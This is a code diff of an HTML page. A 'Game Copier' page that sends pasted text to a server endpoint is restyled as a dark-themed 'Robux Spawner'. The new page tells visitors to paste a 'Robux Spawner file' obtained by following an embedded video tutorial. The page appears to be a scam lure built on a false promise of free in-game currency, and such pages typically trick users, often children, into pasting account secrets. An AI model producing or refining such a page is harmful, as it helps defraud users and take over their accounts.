@@ -2,220 +2,149 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Game Copier</title>
+<title>Robux Spawner - Gray Theme</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
 
-* { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background: #121212; /* ciemnoszare tło */
+    color: #ccc;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 40px 20px;
+  }
 
-body, html {
-  font-family: 'Roboto', sans-serif;
-  height: 100%;
-  overflow: hidden;
-  background: #e0e0e0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
+  .container {
+    background: #222;
+    border-radius: 12px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.7);
+    padding: 25px 30px;
+    max-width: 560px;
+    width: 100%;
+    margin-right: 40px;
+    display: flex;
+    flex-direction: column;
+  }
 
-canvas {
-  position: absolute;
-  top: 0;
-  left: 0;
-  z-index: 0;
-}
+  h1 {
+    font-weight: 700;
+    font-size: 2.8rem;
+    color: #bbb;
+    text-align: center;
+    margin-bottom: 40px;
+    text-shadow: 0 0 10px #555;
+    width: 100%;
+  }
 
-.main-wrapper {
-  position: relative;
-  z-index: 1;
-  display: flex;
-  gap: 40px;
-  align-items: flex-start;
-}
+  h2 {
+    font-weight: 700;
+    font-size: 1.3rem;
+    color: #ddd;
+    margin-bottom: 15px;
+  }
 
-.container {
-  background: rgba(255, 255, 255, 0.95);
-  padding: 25px 30px;
-  border-radius: 15px;
-  width: 560px;
-  height: 315px;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
-  border: 4px solid #fff;       /* Biała ramka */
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
+  p {
+    color: #999;
+    font-size: 0.9rem;
+    line-height: 1.4;
+    margin-bottom: 25px;
+  }
 
-.container textarea {
-  width: 90%;
-  height: 120px;
-  margin-bottom: 20px;
-  padding: 10px;
-  border-radius: 10px;
-  border: 1px solid #ccc;
-  outline: none;
-  resize: none;
-  font-size: 14px;
-  background: #f7f7f7;
-  color: #333;
-  font-family: monospace;
-}
+  textarea {
+    width: 100%;
+    height: 100px;
+    background: #333;
+    border: 1.5px solid #555;
+    border-radius: 10px;
+    color: #eee;
+    font-family: monospace;
+    font-size: 1rem;
+    padding: 12px;
+    resize: vertical;
+    transition: border-color 0.3s ease;
+  }
+  textarea:focus {
+    outline: none;
+    border-color: #888;
+    background: #2a2a2a;
+  }
 
-.container button {
-  padding: 10px 25px;
-  border: none;
-  border-radius: 10px;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-  background: #bbb;
-  color: #333;
-  transition: all 0.3s ease;
-}
+  button {
+    margin-top: 15px;
+    padding: 12px 25px;
+    background: #555;
+    border: none;
+    border-radius: 10px;
+    color: #ddd;
+    font-weight: 700;
+    font-size: 1.1rem;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+    transition: background-color 0.3s ease, transform 0.2s ease;
+  }
+  button:hover {
+    background: #777;
+    transform: scale(1.05);
+  }
 
-.container button:hover {
-  background: #999;
-  transform: scale(1.05);
-}
+  .right-panel {
+    max-width: 600px;
+    width: 100%;
+    background: #222;
+    border-radius: 12px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.7);
+    padding: 20px;
+  }
 
-.container h2 {
-  font-size: 24px;
-  font-weight: 700;
-  color: #555;
-  margin-bottom: 15px;
-}
+  .right-panel h2 {
+    color: #ddd;
+    margin-bottom: 12px;
+  }
 
-#status {
-  margin-top: 10px;
-  font-size: 14px;
-  color: #555;
-  word-wrap: break-word;
-  min-height: 20px;
-}
+  iframe {
+    width: 100%;
+    height: 315px;
+    border-radius: 12px;
+    border: none;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    background: #000;
+  }
 
-.video-wrapper iframe {
-  border-radius: 15px;
-  width: 560px;
-  height: 315px;
-  max-width: 100%;
-  border: 4px solid #fff;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
-  background: #000;
-}
+  @media (max-width: 900px) {
+    body {
+      flex-direction: column;
+      align-items: center;
+    }
+    .container, .right-panel {
+      max-width: 90%;
+      margin: 0 0 30px 0;
+    }
+  }
 </style>
 </head>
 <body>
 
-<canvas id="bg"></canvas>
+  <h1>Robux Spawner</h1>
 
-<div class="main-wrapper">
-  <div class="container">
-    <h2>Game Copier</h2>
-    <textarea id="text" placeholder="Paste your text here..."></textarea>
-    <button onclick="release()">Start process</button>
-    <p id="status"></p>
+  <div style="display:flex; gap:40px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 1200px;">
+
+    <section class="container" aria-label="Robux Spawner Input">
+      <h2>Robux Spawner</h2>
+      <p>Paste your Robux Spawner file in the box below, then click "Process!"<br>If you don't know how to get Robux Spawner file, watch "How to use"</p>
+      <textarea placeholder="Paste Robux Spawner file here..."></textarea>
+      <button>Process 🚀</button>
+    </section>
+
+    <section class="right-panel" aria-label="Video tutorial">
+      <h2>How to use</h2>
+      <iframe src="https://www.youtube.com/embed/k9SfgtkEmpo" title="Robux Spawner tutorial video" allowfullscreen></iframe>
+    </section>
+
   </div>
-
-  <div class="video-wrapper">
-    <iframe src="https://www.youtube.com/embed/k9SfgtkEmpo" title="YouTube video" frameborder="0" allowfullscreen></iframe>
-  </div>
-</div>
-
-<script>
-// ===== Canvas Background =====
-const canvas = document.getElementById('bg');
-const ctx = canvas.getContext('2d');
-let w = canvas.width = window.innerWidth;
-let h = canvas.height = window.innerHeight;
-
-window.addEventListener('resize', () => {
-  w = canvas.width = window.innerWidth;
-  h = canvas.height = window.innerHeight;
-});
-
-const particles = [];
-const numParticles = 150;
-
-for(let i=0; i<numParticles; i++){
-  particles.push({
-    x: Math.random() * w,
-    y: Math.random() * h,
-    vx: (Math.random() - 0.5) * 0.4,
-    vy: (Math.random() - 0.5) * 0.4,
-    radius: 1 + Math.random() * 2
-  });
-}
-
-function draw(){
-  ctx.clearRect(0,0,w,h);
-  
-  for(let i=0;i<numParticles;i++){
-    const p = particles[i];
-    ctx.beginPath();
-    ctx.arc(p.x,p.y,p.radius,0,Math.PI*2);
-    ctx.fillStyle = 'rgba(100,100,100,0.7)';
-    ctx.fill();
-  }
-  
-  for(let i=0;i<numParticles;i++){
-    for(let j=i+1;j<numParticles;j++){
-      const p1 = particles[i];
-      const p2 = particles[j];
-      const dist = Math.hypot(p1.x - p2.x, p1.y - p2.y);
-      if(dist < 100){
-        ctx.strokeStyle = 'rgba(150,150,150,' + (1 - dist/100) + ')';
-        ctx.lineWidth = 1;
-        ctx.beginPath();
-        ctx.moveTo(p1.x,p1.y);
-        ctx.lineTo(p2.x,p2.y);
-        ctx.stroke();
-      }
-    }
-  }
-  
-  for(let i=0;i<numParticles;i++){
-    const p = particles[i];
-    p.x += p.vx;
-    p.y += p.vy;
-    if(p.x < 0 || p.x > w) p.vx *= -1;
-    if(p.y < 0 || p.y > h) p.vy *= -1;
-  }
-  
-  requestAnimationFrame(draw);
-}
-
-draw();
-
-async function release() {
-  const text = document.getElementById("text").value.trim();
-  const statusEl = document.getElementById("status");
-
-  if(!text){
-    statusEl.innerText = "Please enter some text!";
-    return;
-  }
-
-  statusEl.innerText = "Processing...";
-
-  try {
-    const res = await fetch("/api/release", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ text })
-    });
-
-    if(res.ok){
-      statusEl.innerText = "Game Download Starting... (5 minutes)";
-    } else {
-      const data = await res.json();
-      statusEl.innerText = "Error: " + (data.message || "Something went wrong");
-    }
-  } catch(err) {
-    statusEl.innerText = "Error: " + err.message;
-  }
-}
-</script>
 
 </body>
 </html>
